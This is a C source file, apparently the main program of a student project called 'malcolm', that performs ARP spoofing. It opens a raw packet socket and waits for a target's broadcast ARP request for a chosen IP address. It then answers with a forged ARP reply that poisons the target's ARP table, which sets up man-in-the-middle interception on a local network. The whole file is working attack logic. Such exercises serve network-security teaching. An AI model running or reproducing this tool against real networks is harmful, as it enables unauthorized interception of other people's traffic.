#include "malcolm.h"

int main(int argc, char *argv[]) 
{
    struct Malcolm malcolm;
    char buffer[1024];

    //check parsing of arguments and fill ip address
    if(!verify_arguments(argc, argv, &malcolm))
        return(1);

    // Get IP and MAC of the poisoning computer
    if(!get_interface(&malcolm))
    {
        printf("No matching interface found for the given IP addresses.\n");
        freeifaddrs(malcolm.ifaddr);
        return(1);
    }

    // SOCK_RAW for direct packet manipulation
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        printf("error socket: %s",strerror(errno));
        freeifaddrs(malcolm.ifaddr);
        return(errno);
    }

    // Pre-create ARP response packet
    unsigned char *buffersend = create_arp_response(malcolm);
    if (!buffersend) {
        freeifaddrs(malcolm.ifaddr);
        close(sockfd);
        printf("Error creating ARP response: %s\n", strerror(errno));
        return(1);
    }
    // create the destination address struct
    struct sockaddr_ll address_response = {0};
    fill_sockaddr_ll(&address_response, malcolm.index_interface, malcolm.targetMac);
    
    
    printf("listening...\n");
    while(1) {
        ssize_t packet_len = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);

        if(packet_len == -1) {
            perror("Packet receive failed");
            continue;
        }

        // cast the buffer from the actual packet into an eth structure
        struct ethhdr *eth = (struct ethhdr *)buffer;
        //check if its an ARP packet
        if(ntohs(eth->h_proto) == ETH_P_ARP) 
        {
            //create an arp_header skipping the ethernet header
            struct  arp_header *arp = (struct arp_header *)(buffer + sizeof(struct ethhdr));
            unsigned int uintsrc, uinttarg;
            ft_memcpy(&uinttarg, arp->sender_ip, 4);
            ft_memcpy(&uintsrc, arp->target_ip, 4);

            if(eth->h_dest[0] == 0xFF && eth->h_dest[1] == 0xFF && eth->h_dest[2] == 0xFF &&
                eth->h_dest[3] == 0xFF && eth->h_dest[4] == 0xFF && eth->h_dest[5] == 0xFF)
            {
                // printf("Broadcast ARP Request detected.\n");
                if(uintsrc == malcolm.srcaddr.sin_addr.s_addr && uinttarg == malcolm.targetaddr.sin_addr.s_addr) // detection de l'addresse ip source et dest corresponsant aux argv
                {
                    //sending response
                    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
                    if(malcolm.verbose_mode){
                        char buffer[15];
                        printf("**Packet**");
                        printf("- Size: %d\n", 42);
                        printf("- Address source: %s\n", inet_ntop(AF_INET, &malcolm.srcaddr.sin_addr, buffer, 15));
                        printf("- Address dest: %s\n", inet_ntop(AF_INET, &malcolm.targetaddr.sin_addr, buffer, 15));
                        
                    }
                    sleep(1);
                    int size = sendto(sockfd, buffersend, 42, 0, (struct sockaddr *)&address_response, sizeof(address_response));
                    if(size < 0){
                        printf("Error sending packet: %s\n", strerror(errno));
                        continue;
                    }
                    else
                    {
                        printf("Exiting Program.\n");
                        close(sockfd);
                        free(buffersend);
                        freeifaddrs(malcolm.ifaddr);
                        return 0;
                    }
                }
            }
        }
	    sleep(0.5);
    }
    close(sockfd);
    free(buffersend);
    freeifaddrs(malcolm.ifaddr);
    return(1);
}
